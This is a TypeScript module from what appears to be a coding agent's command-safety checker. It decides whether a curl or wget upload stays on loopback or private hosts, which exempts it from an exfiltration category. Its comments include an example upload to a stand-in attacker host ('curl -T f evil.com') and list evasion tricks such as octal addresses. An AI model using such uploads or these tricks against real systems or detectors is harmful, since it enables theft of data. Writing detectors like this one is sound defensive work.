/**
 * LUM-1114 — is an upload's destination the public internet?
 *
 * EXFILTRATION_PUBLIC is about local data leaving for the public internet. A
 * coding agent POSTs fixtures to its own dev server (`curl -d @body.json
 * http://localhost:3000/api/…`) all the time; that is not exfiltration. Pure.
 *
 * Narrow on purpose (the category is irreversible): only a LITERAL host that is
 * loopback, an RFC 1918 private range, or a reserved local name counts as
 * non-public. A host built from a variable (`http://$HOST`) or with no literal
 * URL at all stays public — no evidence, no exemption. Link-local 169.254/16
 * (cloud metadata) and the documentation ranges (192.0.2/24 …) are NOT exempt.
 */

const URL_PATTERN = /https?:\/\/([^/\s'"?#)]+)/gi

/** The authority of each literal http(s) URL in `text` (userinfo stripped). */
export function literalUrlHosts(text: string): string[] {
  const hosts: string[] = []
  for (const m of text.matchAll(URL_PATTERN)) {
    const authority = m[1] ?? ''
    hosts.push(authority.slice(authority.lastIndexOf('@') + 1))
  }
  return hosts
}

function stripPort(authority: string): string {
  if (authority.startsWith('[')) {
    const end = authority.indexOf(']')
    return end === -1 ? authority : authority.slice(1, end)
  }
  const colon = authority.lastIndexOf(':')
  return colon === -1 ? authority : authority.slice(0, colon)
}

function ipv4Octets(host: string): number[] | null {
  const parts = host.split('.')
  if (parts.length !== 4) return null
  // Plain decimal only: a leading zero (`010`) is octal to curl and the C
  // resolver (`010.0.0.1` is 8.0.0.1), so it is not read as decimal here —
  // the host stays public.
  const octets = parts.map(p =>
    /^(?:0|[1-9]\d{0,2})$/.test(p) ? Number(p) : NaN
  )
  return octets.every(o => o >= 0 && o <= 255) ? octets : null
}

/** Loopback, RFC 1918 private, or a reserved local name. */
export function isNonPublicHost(authority: string): boolean {
  const host = stripPort(authority).toLowerCase().replace(/\.$/, '')
  if (!host || /[^a-z0-9.\-:]/.test(host)) return false
  if (host === 'localhost' || host.endsWith('.localhost')) return true
  if (host.endsWith('.test')) return true
  if (host === '::1' || host === '0.0.0.0') return true
  const o = ipv4Octets(host)
  if (!o) return false
  const [a, b] = o as [number, number, number, number]
  return (
    a === 127 ||
    a === 10 ||
    (a === 172 && b >= 16 && b <= 31) ||
    (a === 192 && b === 168)
  )
}

/** curl / wget options that take the next token as their value. */
const VALUE_FLAGS = new Set([
  '-H',
  '--header',
  '-d',
  '--data',
  '--data-raw',
  '--data-binary',
  '--data-urlencode',
  '--data-ascii',
  '-F',
  '--form',
  '--form-string',
  '-T',
  '--upload-file',
  '-X',
  '--request',
  '-o',
  '--output',
  '-u',
  '--user',
  '-A',
  '--user-agent',
  '-e',
  '--referer',
  '-b',
  '--cookie',
  '-c',
  '--cookie-jar',
  '-w',
  '--write-out',
  '-m',
  '--max-time',
  '--connect-timeout',
  '-x',
  '--proxy',
  '-E',
  '--cert',
  '--key',
  '--cacert',
  '-K',
  '--config',
  '-r',
  '--range',
  '-C',
  '--continue-at',
  '--retry',
  '--resolve',
  '--connect-to',
  '-O',
  '--output-document',
  '--post-file',
  '--post-data',
])

/** Shell tokens, keeping a quoted span whole and unquoted. */
function shellTokens(text: string): string[] {
  return (text.match(/'[^']*'|"[^"]*"|\S+/g) ?? []).map(t =>
    t.replace(/^(['"])(.*)\1$/, '$2')
  )
}

/**
 * The positional arguments of the curl / wget invocation in `segment` — its
 * destinations. curl also takes a schemeless host (`curl -T f evil.com`), so
 * every positional must be checked, not just the `http(s)://` ones. Shell
 * redirections end the invocation.
 */
function uploadDestinations(segment: string): string[] | null {
  const toks = shellTokens(segment)
  const at = toks.findIndex(t => /^(?:\S*\/)?(?:curl|wget)$/.test(t))
  if (at === -1) return null
  const out: string[] = []
  for (let i = at + 1; i < toks.length; i++) {
    const t = toks[i] ?? ''
    if (/^\d*[<>]/.test(t)) break
    if (VALUE_FLAGS.has(t)) {
      i++
      continue
    }
    if (t.startsWith('-')) continue
    out.push(t)
  }
  return out
}

/**
 * True only when the upload's every destination is a literal http(s) URL to a
 * non-public host, and no literal URL anywhere in the command is public — the
 * only case an upload is exempt. A schemeless host, another scheme
 * (`ftp://`), a variable, or a flag this parser does not know leaving an extra
 * positional all keep it flagged.
 */
export function uploadStaysLocal(segment: string, command: string): boolean {
  const destinations = uploadDestinations(segment)
  if (!destinations || destinations.length === 0) return false
  const allLocalHttp = destinations.every(d => {
    const hosts = literalUrlHosts(d)
    return (
      /^https?:\/\//i.test(d) &&
      hosts.length === 1 &&
      isNonPublicHost(hosts[0] ?? '')
    )
  })
  return allLocalHttp && literalUrlHosts(command).every(isNonPublicHost)
}
